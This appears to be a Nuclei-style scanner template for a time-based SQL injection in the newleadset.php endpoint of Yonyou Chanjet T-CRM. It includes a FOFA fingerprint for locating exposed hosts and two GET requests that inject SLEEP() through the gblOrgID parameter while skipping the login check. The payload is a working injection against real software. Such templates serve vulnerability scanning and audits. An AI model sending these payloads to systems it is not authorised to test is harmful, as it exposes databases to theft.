id: yonyou-chanjet-crm-newleadset-sql
info:
  name: 用友畅捷通CRM newleadset接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: web.icon=="223dcd70f982801e9177078a818a9b59"
      用友畅捷通T-CRM是用友公司基于B/S架构开发的客户关系管理平台，支持多部门协作及客户全生命周期管理。系统newleadset接口存在SQL注入安全缺陷，攻击者可通过构造恶意输入执行任意SQL语句，导致数据库敏感信息泄露及服务器控制权丧失。该漏洞可能引发企业核心数据外泄与系统权限劫持，构成严重安全威胁。
  tags: 用友畅捷通CRM
http:
- raw:
  - |
    GET /lead/newleadset.php?new_id=1&gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)--+-&DontCheckLogin=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  - |
    GET /lead/newleadset.php?new_id=1&gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(8)))HAjH)--+-&DontCheckLogin=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
